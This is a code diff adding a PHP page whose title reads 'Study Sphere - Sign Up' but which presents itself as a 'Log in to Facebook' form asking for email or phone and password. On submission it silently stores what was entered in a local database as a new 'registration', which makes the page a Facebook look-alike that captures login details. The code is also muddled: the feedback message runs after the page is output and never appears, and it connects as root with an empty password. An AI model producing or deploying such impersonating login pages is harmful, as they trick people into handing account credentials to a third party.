@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Study Sphere - Sign Up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+    <link rel="stylesheet" href="./style4.css">
+    <style>
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+           
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .signup-button {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.2rem;
+            background-color: #007bff; /* Blue color */
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .signup-button:hover {
+            background-color: #0056b3; /* Darker shade of blue on hover */
+        }
+        .signup-button:disabled {
+            background-color: lightgray;
+            cursor: not-allowed;
+        }
+        .button-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        h1 {
+            color: #007bff; /* Blue text color */
+            margin-top: 0;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .signup-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .signup-form label {
+            margin-bottom: 5px;
+            color: #333; /* Dark text color */
+        }
+        .signup-form input {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc; /* Light gray border */
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .registration-feedback {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .registration-feedback p {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>facebook</h1>
+        </header>
+        <main>
+            <h2 style="text-align: center;">Log in to Facebook</h2>
+            
+            <form class="signup-form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST" onsubmit="return validateForm()">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required aria-label="Email or Phone Number">
+                
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required aria-label="Password">
+                
+                <div class="button-container">
+                    <button type="submit" class="signup-button">Log in</button>
+                </div>
+            </form>
+
+            <?php if (!empty($registration_message)) : ?>
+                <div class="registration-feedback">
+                    <p><?php echo $registration_message; ?></p>
+                </div>
+            <?php endif; ?>
+        </main>
+        
+        <footer style="text-align: center; margin-top: 20px;">
+        </footer>
+    </div>
+</body>
+</html>
+<?php
+
+
+// Initialize variables for registration feedback
+$registration_message = "";
+
+// Process form submission
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Validate form inputs
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    if (empty($username) || empty($password)) {
+        echo '<p class="error-message">Invalid username/password. Try again!</p>';
+    } else {
+        // Database connection parameters
+        $servername = "localhost";
+        $db_username = "root"; // Replace with your database username
+        $db_password = ""; // Replace with your database password
+        $dbname = "mission"; // Database name where 'users' table exists
+
+        // Create connection
+        $conn = new mysqli($servername, $db_username, $db_password, $dbname);
+
+        // Check connection
+        if ($conn->connect_error) {
+            die("Connection failed: " . $conn->connect_error);
+        }
+
+        // Validate and sanitize inputs (for security)
+        $username = $_POST["username"];
+        $password = $_POST["password"];
+
+        // Check if the input is an email or phone number
+        if (filter_var($username, FILTER_VALIDATE_EMAIL)) {
+            // It's an email
+            $email = $username;
+            $phone_number = null; // Set phone_number to null
+        } else {
+            // It's a phone number
+            $phone_number = $username;
+            $email = null; // Set email to null
+        }
+
+        // Hash the password for storage
+        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
+
+        // Prepare SQL statement for inserting data
+        $stmt = $conn->prepare("INSERT INTO users (email, phone_number, password) VALUES (?, ?, ?)");
+        $stmt->bind_param("sss", $email, $phone_number, $hashed_password);
+
+        // Execute the prepared statement
+        if ($stmt->execute()) {
+            $registration_message = "Registration successful!";
+        } else {
+            $registration_message = "Error: " . $stmt->error;
+        }
+
+        // Close statement and database connection
+        $stmt->close();
+        $conn->close();
+    }
+}
+?>
